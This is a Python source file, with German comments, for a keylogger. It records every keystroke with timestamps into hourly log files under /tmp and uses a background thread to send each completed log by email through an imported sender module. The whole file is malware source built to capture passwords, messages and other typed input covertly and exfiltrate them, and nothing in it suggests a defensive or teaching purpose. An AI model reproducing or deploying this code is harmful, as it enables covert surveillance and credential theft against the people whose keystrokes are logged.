from pynput import keyboard
from datetime import datetime
from threading import Thread
import time 
import email_sender
import threading

init_email=email_sender.email_sender_class()
class keylogger_class:
    def keylogger_funktion(self):
        global old_filename
        new_filename=""
        global handle
        global send_go
        send_go=0
        log_destination = "/tmp/" #Pfad zur Log datei   <--- !!!!!!!MUSS JE NACH OS EDITIERT WERDEN!!!!!!!
        now = datetime.now()
        new_filename = now.strftime("%Y%m%d%H") + ".log"      # zeitabstände
        old_filename = new_filename
        handle = open(log_destination + new_filename, "w")

        def send_email():
            global send_go
            while True:
                if send_go==1:
                    init_email.email_sender_funk(log_destination,sendme)
                    send_go=0

        email_thread=Thread(target=send_email)
        email_thread.start()

        def on_press(key):
            global old_filename
            global new_filename
            global handle
            global send_go
            now = datetime.now()
            new_filename = now.strftime("%Y%m%d%H") + ".log"  # zeitabstände
            # Log entry
            try:
                handle.write('{0}: {1} \n'.format(now.strftime("%d.%m.%Y, %H:%M:%S"), key.char))
            except AttributeError:
                handle.write('{0}: {1} \n'.format(now.strftime("%d.%m.%Y, %H:%M:%S"), key))

            # check and open new file
            zeahler=0
            if old_filename != new_filename:
                global sendme
                sendme=old_filename
                handle.close()
                handle = open(log_destination + new_filename, "w")
                old_filename = new_filename

                if zeahler == 0:
                    send_go=1
                    zeahler=1
                    
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()